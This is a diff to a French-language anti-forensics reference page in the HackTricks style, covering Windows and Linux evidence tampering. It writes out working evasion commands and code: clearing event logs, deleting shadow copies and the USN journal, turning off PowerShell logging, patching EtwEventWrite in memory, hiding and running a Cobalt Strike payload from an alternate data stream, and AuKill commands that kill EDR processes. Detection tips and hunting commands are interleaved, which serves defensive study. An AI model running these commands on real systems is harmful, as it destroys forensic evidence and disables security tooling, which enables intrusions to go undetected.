@@ -4,7 +4,7 @@
 
 ## Horodatages
 
-Un attaquant peut être intéressé par **changer les horodatages des fichiers** pour éviter d'être détecté.\
+Un attaquant peut être intéressé par **le changement des horodatages des fichiers** pour éviter d'être détecté.\
 Il est possible de trouver les horodatages à l'intérieur du MFT dans les attributs `$STANDARD_INFORMATION` \_\_ et \_\_ `$FILE_NAME`.
 
 Les deux attributs ont 4 horodatages : **Modification**, **accès**, **création**, et **modification du registre MFT** (MACE ou MACB).
@@ -50,11 +50,11 @@ Les horodatages **NTFS** ont une **précision** de **100 nanosecondes**. Ainsi, 
 
 ### SetMace - Outil Anti-forensique
 
-Cet outil peut modifier les deux attributs `$STARNDAR_INFORMATION` et `$FILE_NAME`. Cependant, depuis Windows Vista, il est nécessaire d'avoir un OS en direct pour modifier ces informations.
+Cet outil peut modifier les deux attributs `$STARNDAR_INFORMATION` et `$FILE_NAME`. Cependant, depuis Windows Vista, il est nécessaire qu'un OS en direct modifie ces informations.
 
 ## Masquage de Données
 
-NFTS utilise un cluster et la taille minimale d'information. Cela signifie que si un fichier occupe un et demi cluster, la **moitié restante ne sera jamais utilisée** jusqu'à ce que le fichier soit supprimé. Il est donc possible de **cacher des données dans cet espace de remplissage**.
+NFTS utilise un cluster et la taille minimale d'information. Cela signifie que si un fichier occupe et utilise un cluster et demi, la **moitié restante ne sera jamais utilisée** jusqu'à ce que le fichier soit supprimé. Il est donc possible de **cacher des données dans cet espace de remplissage**.
 
 Il existe des outils comme slacker qui permettent de cacher des données dans cet espace "caché". Cependant, une analyse du `$logfile` et du `$usnjrnl` peut montrer que certaines données ont été ajoutées :
 
@@ -109,25 +109,25 @@ Chaque fois qu'un dossier est ouvert à partir d'un volume NTFS sur un serveur W
 
 ### Supprimer l'Historique USB
 
-Tous les **Entrées de Périphériques USB** sont stockées dans le Registre Windows sous la clé de registre **USBSTOR** qui contient des sous-clés créées chaque fois que vous branchez un périphérique USB sur votre PC ou ordinateur portable. Vous pouvez trouver cette clé ici `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **En supprimant cela**, vous supprimerez l'historique USB.\
+Toutes les **Entrées de Périphériques USB** sont stockées dans le Registre Windows sous la clé de registre **USBSTOR** qui contient des sous-clés créées chaque fois que vous branchez un périphérique USB sur votre PC ou ordinateur portable. Vous pouvez trouver cette clé ici `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **En supprimant cela**, vous supprimerez l'historique USB.\
 Vous pouvez également utiliser l'outil [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) pour vous assurer que vous les avez supprimés (et pour les supprimer).
 
 Un autre fichier qui sauvegarde des informations sur les USB est le fichier `setupapi.dev.log` à l'intérieur de `C:\Windows\INF`. Cela devrait également être supprimé.
 
-### Désactiver les Copies de Sécurité
+### Désactiver les Copies d'Ombre
 
-**Lister** les copies de sécurité avec `vssadmin list shadowstorage`\
+**Lister** les copies d'ombre avec `vssadmin list shadowstorage`\
 **Les supprimer** en exécutant `vssadmin delete shadow`
 
 Vous pouvez également les supprimer via l'interface graphique en suivant les étapes proposées dans [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)
 
-Pour désactiver les copies de sécurité [étapes à partir d'ici](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):
+Pour désactiver les copies d'ombre [étapes à partir d'ici](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):
 
 1. Ouvrez le programme Services en tapant "services" dans la zone de recherche après avoir cliqué sur le bouton de démarrage Windows.
 2. Dans la liste, trouvez "Volume Shadow Copy", sélectionnez-le, puis accédez aux Propriétés en cliquant avec le bouton droit.
 3. Choisissez Désactivé dans le menu déroulant "Type de démarrage", puis confirmez le changement en cliquant sur Appliquer et OK.
 
-Il est également possible de modifier la configuration des fichiers qui vont être copiés dans la copie de sécurité dans le registre `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`
+Il est également possible de modifier la configuration des fichiers qui vont être copiés dans la copie d'ombre dans le registre `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`
 
 ### Écraser les fichiers supprimés
 
@@ -142,12 +142,155 @@ Il est également possible de modifier la configuration des fichiers qui vont ê
 
 ### Désactiver les journaux d'événements Windows
 
-- `reg add 'HKLM\SYSTEM\CurrentControlSet\Services\eventlog' /v Start /t REG_DWORD /d 4 /f`
+- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
 - Dans la section des services, désactivez le service "Journal des événements Windows"
 - `WEvtUtil.exec clear-log` ou `WEvtUtil.exe cl`
 
 ### Désactiver $UsnJrnl
 
 - `fsutil usn deletejournal /d c:`
+
+---
+
+## Journalisation Avancée & Manipulation de Trace (2023-2025)
+
+### Journalisation des ScriptBlocks/Modules PowerShell
+
+Les versions récentes de Windows 10/11 et Windows Server conservent des **artéfacts forensiques PowerShell riches** sous
+`Microsoft-Windows-PowerShell/Operational` (événements 4104/4105/4106).
+Les attaquants peuvent les désactiver ou les effacer à la volée :
+```powershell
+# Turn OFF ScriptBlock & Module logging (registry persistence)
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
+-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
+-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force
+
+# In-memory wipe of recent PowerShell logs
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
+Remove-WinEvent               # requires admin & Win11 23H2+
+```
+Les défenseurs devraient surveiller les modifications apportées à ces clés de registre et la suppression en grande quantité des événements PowerShell.
+
+### Patch ETW (Event Tracing for Windows)
+
+Les produits de sécurité des points de terminaison s'appuient fortement sur ETW. Une méthode d'évasion populaire en 2024 consiste à patcher `ntdll!EtwEventWrite`/`EtwEventWriteFull` en mémoire afin que chaque appel ETW renvoie `STATUS_SUCCESS` sans émettre l'événement :
+```c
+// 0xC3 = RET on x64
+unsigned char patch[1] = { 0xC3 };
+WriteProcessMemory(GetCurrentProcess(),
+GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
+patch, sizeof(patch), NULL);
+```
+Public PoCs (e.g. `EtwTiSwallow`) implémentent la même primitive en PowerShell ou C++.  
+Parce que le patch est **local au processus**, les EDRs fonctionnant dans d'autres processus peuvent le manquer.  
+Détection : comparer `ntdll` en mémoire vs. sur disque, ou intercepter avant le mode utilisateur.
+
+### Revival des Flux de Données Alternatifs (ADS)
+
+Des campagnes de malware en 2023 (e.g. **FIN12** loaders) ont été observées mettant en scène des binaires de deuxième étape à l'intérieur des ADS pour rester hors de vue des scanners traditionnels :
+```cmd
+rem Hide cobalt.bin inside an ADS of a PDF
+type cobalt.bin > report.pdf:win32res.dll
+rem Execute directly
+wmic process call create "cmd /c report.pdf:win32res.dll"
+```
+Énumérez les flux avec `dir /R`, `Get-Item -Stream *`, ou Sysinternals `streams64.exe`. Copier le fichier hôte vers FAT/exFAT ou via SMB supprimera le flux caché et peut être utilisé par les enquêteurs pour récupérer la charge utile.
+
+### BYOVD & “AuKill” (2023)
+
+Bring-Your-Own-Vulnerable-Driver est désormais couramment utilisé pour **anti-forensics** dans les intrusions par ransomware. L'outil open-source **AuKill** charge un pilote signé mais vulnérable (`procexp152.sys`) pour suspendre ou terminer les capteurs EDR et forensiques **avant le chiffrement et la destruction des journaux** :
+```cmd
+AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
+AuKill.exe -k CrowdStrike
+```
+Le pilote est supprimé par la suite, laissant des artefacts minimes.  
+Atténuations : activer la liste de blocage des pilotes vulnérables de Microsoft (HVCI/SAC) et alerter sur la création de services du noyau à partir de chemins modifiables par l'utilisateur.
+
+---
+
+## Linux Anti-Forensics : Auto-correction et Cloud C2 (2023–2025)
+
+### Auto-correction des services compromis pour réduire la détection (Linux)  
+Les adversaires "s'auto-corrigent" de plus en plus un service juste après l'avoir exploité pour à la fois prévenir la ré-exploitation et supprimer les détections basées sur des vulnérabilités. L'idée est de remplacer les composants vulnérables par les derniers binaires/JARs légitimes en amont, de sorte que les scanners rapportent l'hôte comme corrigé tout en maintenant la persistance et le C2.
+
+Exemple : Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)  
+- Après l'exploitation, les attaquants ont récupéré des JARs légitimes depuis Maven Central (repo1.maven.org), supprimé les JARs vulnérables dans l'installation d'ActiveMQ et redémarré le courtier.  
+- Cela a fermé le RCE initial tout en maintenant d'autres points d'ancrage (cron, modifications de la configuration SSH, implants C2 séparés).
+
+Exemple opérationnel (illustratif)
+```bash
+# ActiveMQ install root (adjust as needed)
+AMQ_DIR=/opt/activemq
+cd "$AMQ_DIR"/lib
+
+# Fetch patched JARs from Maven Central (versions as appropriate)
+curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
+curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar
+
+# Remove vulnerable files and ensure the service uses the patched ones
+rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
+ln -sf activemq-client-5.18.3.jar activemq-client.jar
+ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar
+
+# Apply changes without removing persistence
+systemctl restart activemq || service activemq restart
+```
+Forensic/hunting tips
+- Examine les répertoires de services pour des remplacements de binaire/JAR non planifiés :
+- Debian/Ubuntu : `dpkg -V activemq` et comparez les hachages/chemins de fichiers avec les miroirs de dépôt.
+- RHEL/CentOS : `rpm -Va 'activemq*'`
+- Recherchez les versions JAR présentes sur le disque qui ne sont pas détenues par le gestionnaire de paquets, ou des liens symboliques mis à jour hors bande.
+- Chronologie : `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` pour corréler ctime/mtime avec la fenêtre de compromission.
+- Historique de shell/télémetrie de processus : preuves de `curl`/`wget` vers `repo1.maven.org` ou d'autres CDN d'artefacts immédiatement après l'exploitation initiale.
+- Gestion des changements : validez qui a appliqué le "patch" et pourquoi, pas seulement qu'une version corrigée est présente.
+
+### Cloud‑service C2 avec des jetons porteurs et des stagers anti-analyse
+Le savoir-faire observé combinait plusieurs chemins C2 à long terme et un emballage anti-analyse :
+- Chargeurs ELF PyInstaller protégés par mot de passe pour entraver le sandboxing et l'analyse statique (par exemple, PYZ chiffré, extraction temporaire sous `/_MEI*`).
+- Indicateurs : hits `strings` tels que `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
+- Artefacts d'exécution : extraction vers `/tmp/_MEI*` ou chemins personnalisés `--runtime-tmpdir`.
+- C2 soutenu par Dropbox utilisant des jetons OAuth Bearer codés en dur
+- Marqueurs réseau : `api.dropboxapi.com` / `content.dropboxapi.com` avec `Authorization: Bearer <token>`.
+- Recherchez dans les proxy/NetFlow/Zeek/Suricata des HTTPS sortants vers des domaines Dropbox à partir de charges de travail serveur qui ne synchronisent normalement pas de fichiers.
+- C2 parallèle/de secours via tunneling (par exemple, Cloudflare Tunnel `cloudflared`), gardant le contrôle si un canal est bloqué.
+- IOCs d'hôte : processus/unites `cloudflared`, config à `~/.cloudflared/*.json`, sortant 443 vers les bords de Cloudflare.
+
+### Persistance et "rollback de durcissement" pour maintenir l'accès (exemples Linux)
+Les attaquants associent fréquemment auto-correction et chemins d'accès durables :
+- Cron/Anacron : modifications du stub `0anacron` dans chaque répertoire `/etc/cron.*/` pour une exécution périodique.
+- Chasse :
+```bash
+for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
+grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
+```
+- Rétrogradation de durcissement de la configuration SSH : activation des connexions root et modification des shells par défaut pour les comptes à faible privilège.
+- Chasse pour l'activation de la connexion root :
+```bash
+grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
+# valeurs de drapeau comme "yes" ou paramètres trop permissifs
+```
+- Chasse pour des shells interactifs suspects sur des comptes système (par exemple, `games`) :
+```bash
+awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
+```
+- Artefacts de balise aléatoires et de noms courts (8 caractères alphabétiques) déposés sur le disque qui contactent également le C2 cloud :
+- Chasse :
+```bash
+find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
+-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
+```
+
+Les défenseurs devraient corréler ces artefacts avec l'exposition externe et les événements de patch de service pour découvrir l'auto-rémédiation anti-forensique utilisée pour cacher l'exploitation initiale.
+
+## References
+
+- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (Mars 2023)
+https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
+- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (Juin 2024)
+https://redcanary.com/blog/etw-patching-detection
+
+- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
+- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
 
 {{#include ../../banners/hacktricks-training.md}}
